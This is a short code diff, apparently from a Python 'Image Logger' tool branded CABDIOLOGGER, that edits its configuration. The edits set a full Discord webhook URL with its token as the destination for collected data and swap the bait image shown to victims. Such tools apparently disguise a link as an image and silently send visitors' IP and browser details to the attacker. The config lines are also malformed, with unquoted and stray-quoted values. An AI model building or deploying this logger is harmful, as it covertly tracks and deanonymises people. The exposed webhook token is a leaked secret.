@@ -11,8 +11,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook":https://discord.com/api/webhooks/1430391405234094100/6nN5ykvUU5QdR1qFTGVMF4LrlWuACwlvbeisD8dVVN-lNDhZ03QQf7HQgNhylVV5-IIS
-    "image": https://gifdb.com/images/high/crazy-man-shots-fired-2v0c0u6l0epejcx6.gif
+    "webhook":https://discord.com/api/webhooks/1430391405234094100/6nN5ykvUU5QdR1qFTGVMF4LrlWuACwlvbeisD8dVVN-lNDhZ03QQf7HQgNhylVV5-IIS ",
+    "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/4e4bf4eb-290b-47fd-ae2f-8dbfbacf3e7a/d1chc7a-964759a7-8447-4612-9dc5-c9d39a404db6.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
@@ -284,3 +284,4 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+
